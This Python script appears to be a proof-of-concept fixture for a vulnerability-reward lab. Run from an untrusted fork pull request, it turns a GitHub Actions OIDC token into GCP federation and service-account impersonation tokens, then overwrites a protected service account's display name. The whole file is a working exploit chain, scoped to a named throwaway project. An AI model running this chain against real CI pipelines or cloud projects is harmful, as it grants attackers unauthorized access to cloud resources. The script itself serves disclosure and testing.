"""Untrusted fork fixture for a dedicated synthetic GitHub/GCP mirror.

Uses only the ephemeral WIF identity exported to this exact downstream job and
mutates only the pre-authorized throwaway target service account's display name.
No key creation, credential exfiltration, customer resource, or unrelated project access.
"""
from __future__ import annotations

import json
import os
from pathlib import Path
from urllib.error import HTTPError
from urllib.parse import quote
from urllib.request import Request, urlopen


def request_json(method: str, url: str, body: dict | None = None, token: str | None = None, bearer: str | None = None):
    headers = {"Accept": "application/json", "Content-Type": "application/json"}
    if token:
        headers["Authorization"] = "Bearer " + token
    if bearer:
        headers["Authorization"] = "Bearer " + bearer
    request = Request(url, method=method, data=json.dumps(body).encode() if body is not None else None, headers=headers)
    try:
        with urlopen(request, timeout=60) as response:
            raw = response.read()
            return response.status, json.loads(raw) if raw else {}
    except HTTPError as error:
        return error.code, {}
    except Exception as error:
        raise RuntimeError(f"Expected synthetic endpoint failed: {error.__class__.__name__}") from None


def expect_ok(result, stage: str) -> dict:
    status, body = result
    if status < 200 or status >= 300:
        raise RuntimeError(f"Synthetic {stage} request returned status {status}")
    return body


def main() -> None:
    run_id = os.environ.get("GITHUB_RUN_ID", "")
    assert run_id.isdigit(), "Synthetic workflow run ID expected"
    credential_path = Path(os.environ["GOOGLE_APPLICATION_CREDENTIALS"])
    credential = json.loads(credential_path.read_text())
    assert credential["type"] == "external_account"
    assert credential["token_url"].startswith("https://sts.googleapis.com/")
    assert credential["service_account_impersonation_url"].startswith("https://iamcredentials.googleapis.com/")

    project = os.environ["LAB_GCP_PROJECT"]
    target = os.environ["LAB_TARGET_SERVICE_ACCOUNT"]
    assert project == "vrp-lab-20261125-f150d192"
    assert target == f"mirror-protected-c7cb6d5@{project}.iam.gserviceaccount.com"
    target_url = "https://iam.googleapis.com/v1/projects/" + quote(project, safe="") + "/serviceAccounts/" + quote(target, safe="")

    # Independent negative control: no bearer credential cannot read the target.
    denied_status, _ = request_json("GET", target_url)
    assert denied_status in {401, 403}, f"Expected denied unauthenticated target read, got {denied_status}"

    source = credential["credential_source"]
    oidc_url = source["url"]
    assert ".actions.githubusercontent.com/" in oidc_url
    oidc = expect_ok(request_json("GET", oidc_url, bearer=source["headers"]["Authorization"].removeprefix("Bearer ")), "OIDC request")
    subject_token = oidc[source["format"]["subject_token_field_name"]]
    federation = expect_ok(request_json("POST", credential["token_url"], {
        "audience": credential["audience"],
        "grantType": "urn:ietf:params:oauth:grant-type:token-exchange",
        "requestedTokenType": "urn:ietf:params:oauth:token-type:access_token",
        "scope": "https://www.googleapis.com/auth/cloud-platform",
        "subjectTokenType": credential["subject_token_type"],
        "subjectToken": subject_token,
    }), "federation")
    service_token = expect_ok(request_json("POST", credential["service_account_impersonation_url"], {
        "delegates": [],
        "scope": ["https://www.googleapis.com/auth/cloud-platform"],
        "lifetime": "600s",
    }, token=federation["access_token"]), "service-account impersonation")["accessToken"]

    before = expect_ok(request_json("GET", target_url, token=service_token), "protected read")
    marker = "untrusted-pr-write-verified-" + run_id
    assert before.get("displayName") != marker, "Marker already existed before this test"
    expect_ok(request_json("PATCH", target_url, {"serviceAccount": {"displayName": marker}, "updateMask": "displayName"}, token=service_token), "protected metadata write")
    after = expect_ok(request_json("GET", target_url, token=service_token), "protected verification read")
    assert after.get("displayName") == marker, "Protected metadata did not change"

    result = {
        "run_id": run_id,
        "unauthenticated_target_read_denied": denied_status,
        "oidc_accepted": True,
        "wif_federation_accepted": True,
        "service_account_impersonation_accepted": True,
        "protected_target_read": True,
        "protected_target_display_name_changed": after.get("displayName") == marker,
        "synthetic_target": target,
        "synthetic_run_marker": marker,
        "no_long_lived_key_created_or_printed": True,
        "no_tokens_printed_or_saved": True,
    }
    Path(os.environ["RUNNER_TEMP"], "live-attack-observation.json").write_text(json.dumps(result, indent=2) + "\n")
    print("SYNTHETIC_OIDC_WIF_SERVICE_ACCOUNT_CHAIN_COMPLETE")
    print("SYNTHETIC_PROTECTED_METADATA_WRITE_CONFIRMED")


if __name__ == "__main__":
    main()
